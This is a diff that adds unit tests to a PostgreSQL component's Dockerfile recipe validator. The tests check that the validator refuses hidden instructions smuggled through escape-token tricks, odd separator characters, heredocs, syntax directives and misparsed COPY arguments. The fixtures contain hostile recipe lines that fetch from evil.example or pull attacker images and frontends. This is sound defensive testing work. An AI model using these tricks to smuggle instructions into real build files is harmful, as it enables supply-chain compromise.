@@ -528,6 +528,116 @@ class PostgresComponentTests(unittest.TestCase):
         path.write_text("# syntax highlighting note\n# check the escape rules\n" + path.read_text())
         component.validate_recipe(self.root)
 
+    def recipe_with(self, prefix: str = "", suffix: str = "") -> None:
+        path = self.runtime / "Dockerfile"
+        path.write_bytes((prefix + (ROOT / "infra/images/postgres/Dockerfile").read_text() + suffix).encode())
+
+    def assert_recipes_refused(self, message: str, recipes: list[tuple[str, str]]) -> None:
+        for prefix, suffix in recipes:
+            self.recipe_with(prefix, suffix)
+            with self.subTest(prefix=prefix, suffix=suffix), self.assertRaisesRegex(ValueError, message):
+                component.validate_recipe(self.root)
+
+    def test_escape_token_glued_to_the_previous_character_is_refused(self) -> None:
+        # BuildKit's continuation rule is ([^\\])\\[ \t]*$|^\\[ \t]*$ and it joins lines without a separator, so
+        # a doubled token ends the instruction and a glued token forms one word with the next line.
+        self.assert_recipes_refused("continuation", [
+            ("", "RUN echo ok \\\\\nADD https://evil.example/x /x\n"),
+            ("", "RUN echo ok \\\\\nFROM attacker/image:latest\n"),
+            ("", "RUN echo ok \\\\\\\nENTRYPOINT [\"/x\"]\n"),
+            ("", "RUN echo ok \\\\ \t\nADD https://evil.example/x /x\n"),
+            ("", "RUN -\\\n-network=host true\n"),
+            ("", "RUN cat <\\\n<EOF\nbody\nEOF\n"),
+            ("", "RUN echo a\\\n  && echo b\n"),
+            ("", "RUN echo a \\\n\\\n  && echo b\n"),
+        ])
+
+    def test_characters_that_python_and_buildkit_split_differently_are_refused(self) -> None:
+        separators = ["\r", "\x0b", "\x0c", "\x1c", "\x1d", "\x1e", "\x1f", "\x85", "\xa0", "\u2028", "\u2029",
+                      "\u3000", "\u200b", "\ufeff"]
+        self.assert_recipes_refused("character", [
+            ("", "RUN echo \\" + separator + "# hidden\nADD https://evil.example/x /x\n")
+            for separator in separators])
+        self.assert_recipes_refused("character", [
+            ("", "# comment" + separator + "\n") for separator in separators])
+
+    def test_carriage_returns_are_refused_even_as_ordinary_line_endings(self) -> None:
+        self.assert_recipes_refused("character", [("", "RUN echo a \\\r\n  && echo b\r\n"), ("", "USER 0\r")])
+
+    def test_non_utf8_recipe_is_refused(self) -> None:
+        path = self.runtime / "Dockerfile"
+        path.write_bytes((ROOT / "infra/images/postgres/Dockerfile").read_bytes() + b"# \xff\n")
+        with self.assertRaisesRegex(ValueError, "can't decode byte 0xff"):
+            component.validate_recipe(self.root)
+
+    def test_heredocs_are_refused_because_their_bodies_are_not_instructions(self) -> None:
+        self.assert_recipes_refused("heredoc", [
+            ("", "RUN <<USER\nRUN curl https://evil.example\nUSER\n"),
+            ("", "RUN <<-USER\n\tRUN curl https://evil.example\n\tUSER\n"),
+            ("", "RUN cat << USER\nUSER 0\nUSER\n"),
+            ("", "RUN 3<<USER\nUSER\n"),
+            ("", "run <<USER\nRUN curl https://evil.example\nUSER\n"),
+            ("", "RUN <<'E\\'\nRUN true \\\nE\\\nADD https://evil.example/x /x\n"),
+            ("", "RUN <<'E \\'\nRUN true \\\nE \\\nADD https://evil.example/x /x\n"),
+            ("", "RUN cat <<USER \\\n  && echo tail\nUSER\n"),
+        ])
+
+    def test_copy_words_that_shlex_and_buildkit_split_differently_are_refused(self) -> None:
+        source = "infra/images/postgres/pg_hba.duora.conf"
+        self.assert_recipes_refused("plain words", [
+            ("", f"COPY {source} backend/segredo\\ /d\n"),
+            ("", f"copy {source} backend/segredo\\ /d\n"),
+            ("", f"COPY --chmod=644 {source} backend/segredo\\ /d\n"),
+            ("", f'COPY "{source}" /d\n'),
+            ("", f'COPY ["{source}", "/d"]\n'),
+            ("", f'COPY "--chmod=644" {source} /d\n'),
+            ("", f"COPY --chmod=644 {source} /d\\ir\n"),
+        ])
+        self.assert_recipes_refused("closing quotation", [("", f"COPY {source} 'backend/segredo /d\n")])
+
+    def test_alternative_syntax_directive_forms_are_refused(self) -> None:
+        self.assert_recipes_refused("instruction", [("// syntax=attacker/frontend\n", "")])
+        self.assert_recipes_refused("instruction", [('{"syntax": "attacker/frontend"}\n', "")])
+        self.assert_recipes_refused("character", [
+            ("#!x\x0bRUN a \\\n// syntax=attacker/frontend\nRUN b\n", ""),
+            ("\ufeff# syntax=attacker/frontend\n", ""),
+            ("#\x85escape=`\n", ""),
+        ])
+        self.assert_recipes_refused("parser directive", [
+            ("  # escape=`\n", ""),
+            ("#!shebang\n# syntax=attacker/frontend\n", ""),
+            ("# an ordinary comment\n# escape=`\n", ""),
+            ("", "# escape=`\n"),
+        ])
+
+    def test_comments_do_not_continue_the_previous_or_their_own_line(self) -> None:
+        self.assert_recipes_refused("Unsupported PostgreSQL recipe instruction", [
+            ("", "# comment \\\nADD https://evil.example/x /x\n"),
+            ("", "RUN echo a\n# comment \\\nADD https://evil.example/x /x\n"),
+        ])
+
+    def test_continuation_at_end_of_file_is_refused(self) -> None:
+        self.assert_recipes_refused("Incomplete", [("", "RUN echo a \\\n"), ("", "RUN echo a \\\n# trailing\n\n")])
+
+    def test_reviewed_continuation_forms_are_accepted(self) -> None:
+        for suffix in ["RUN echo a \\\n  # note\n  && echo b\n",
+                       "RUN echo a \\\n# note ending in a token \\\n  && echo b\n",
+                       "RUN echo a \\\n\n  && echo b\n",
+                       "RUN echo a \\   \n  && echo b\n",
+                       "RUN echo a\t\\\n  && echo b\n",
+                       "RUN echo a \\\\ \\\n  && echo b\n",
+                       "# ação com acento, <<EOF e barra dupla \\\\\nUSER 999:999\n"]:
+            self.recipe_with(suffix=suffix)
+            with self.subTest(suffix=suffix):
+                component.validate_recipe(self.root)
+
+    def test_cli_refuses_a_hidden_instruction_without_a_fingerprint(self) -> None:
+        self.recipe_with(suffix="RUN echo ok \\\\\nFROM attacker/image:latest\n")
+        result = self.cli("recipe", "--root", str(self.root))
+        self.assertEqual(result.returncode, 1)
+        self.assertEqual(result.stdout, "")
+        self.assertIn("PostgreSQL component refused", result.stderr)
+
     def test_cli_exposes_the_history_decisions(self) -> None:
         lock, run, _ = self.qualification()
         (self.root / "lock.json").write_text(json.dumps(lock))
